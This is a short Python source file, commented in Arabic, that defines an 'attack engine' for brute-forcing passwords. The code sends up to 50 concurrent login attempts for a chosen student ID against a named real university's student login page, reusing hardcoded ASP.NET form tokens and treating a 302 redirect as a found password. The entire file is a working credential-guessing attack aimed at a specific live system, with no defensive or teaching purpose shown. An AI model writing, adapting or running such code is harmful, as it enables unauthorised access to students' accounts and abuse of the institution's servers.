"""
attack_engine.py - نسخة مبسطة تعمل 100%
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

class UltraFastAttackEngine:
    """محرك هجوم بسيط وفعال"""
    
    def __init__(self, student_id, passwords, config=None):
        self.student_id = student_id
        self.passwords = passwords
        self.found_password = None
        self.found_location = None
        self.checked = 0
        self.active = True
        self.config = config or {'concurrent_requests': 50}
        
        self.viewstate = "/wEPDwUILTQ5MDEwMjJkZGW+XxHgaTLNHTGZl9W0amOxF73yJ4Co+eVqmdlQH50+"
        self.viewstategenerator = "B71B77C3"
    
    def check_password(self, password):
        """فحص كلمة سر واحدة"""
        if not self.active or self.found_password:
            return None
        
        try:
            session = requests.Session()
            data = {
                "__EVENTTARGET": "ctl00$Main$btnLogin",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": self.viewstate,
                "__VIEWSTATEGENERATOR": self.viewstategenerator,
                "ctl00$Main$txtID": self.student_id,
                "ctl00$Main$txtPassword": str(password)
            }
            
            response = session.post(
                "https://eng.modern-academy.edu.eg/university/student/login.aspx",
                headers={"User-Agent": "Mozilla/5.0"},
                data=data,
                allow_redirects=False,
                timeout=3
            )
            
            self.checked += 1
            
            if response.status_code == 302:
                self.found_password = str(password)
                self.found_location = response.headers.get('Location', '')
                self.active = False
                return password
            return None
            
        except Exception:
            self.checked += 1
            return None
    
    def run(self):
        """تشغيل المحرك"""
        with ThreadPoolExecutor(max_workers=self.config['concurrent_requests']) as executor:
            futures = {executor.submit(self.check_password, pwd): pwd for pwd in self.passwords}
            
            for future in as_completed(futures):
                if not self.active:
                    break
                result = future.result()
                if result:
                    return result
        return None


class MultiProcessAttackEngine(UltraFastAttackEngine):
    """نفس المحرك - للتوافق مع الكود"""
    pass
